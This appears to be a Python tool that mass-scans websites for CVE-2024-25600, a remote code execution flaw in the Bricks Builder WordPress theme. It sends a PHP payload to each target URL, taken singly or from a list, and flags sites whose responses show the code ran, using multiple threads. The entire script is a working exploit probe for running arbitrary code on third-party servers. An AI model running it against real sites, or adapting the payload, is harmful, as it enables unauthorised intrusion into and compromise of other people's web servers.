import requests
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor

VULN_HASH = "4d165b3c3f91f3b7b5f3d1a1e6d44c29"  # md5('bricks_check')

def normalize_url(url):
    if not url.startswith('http'):
        url = 'http://' + url
    if not url.endswith('/'):
        url += '/'
    return url

def scan_target(url):
    url = normalize_url(url)
    endpoint = url + '?bricks=run&bricksforge_execute=php'
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "BricksRCE-DedSec/1.0"
    }
    payload = {"code": "echo md5('bricks_check');"}

    try:
        response = requests.post(endpoint, headers=headers, data=payload, timeout=10)
        if VULN_HASH in response.text:
            print(f"[VULNERABLE] {url}")
        else:
            print(f"[SAFE]       {url}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR]      {url} - {e}")

def print_banner():
    banner = r"""
 ____       _      ____                 _     
|  _ \ ___ | | ___|  _ \ ___  ___ _ __ | |__  
| |_) / _ \| |/ _ \ |_) / _ \/ __| '_ \| '_ \ 
|  __/ (_) | |  __/  __/ (_) \__ \ |_) | | | |
|_|   \___/|_|\___|_|   \___/|___/ .__/|_| |_|
                                 |_|          
   Bricks Builder RCE Scanner - CVE-2024-25600
                by DedSec | v1.0
"""
    print(banner)

def main():
    parser = argparse.ArgumentParser(description="Detect CVE-2024-25600 - Bricks Builder RCE")
    parser.add_argument("-u", "--url", help="Target URL (e.g. https://example.com)")
    parser.add_argument("-l", "--list", help="File with list of URLs (one per line)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads (default: 5)")
    args = parser.parse_args()

    print_banner()

    targets = []

    if args.url:
        targets.append(args.url)
    elif args.list:
        try:
            with open(args.list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[ERROR] File not found: {args.list}")
            sys.exit(1)
    else:
        parser.print_help()
        sys.exit(1)

    print(f"[INFO] Scanning {len(targets)} target(s)...\n")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(scan_target, targets)

if __name__ == "__main__":
    main()
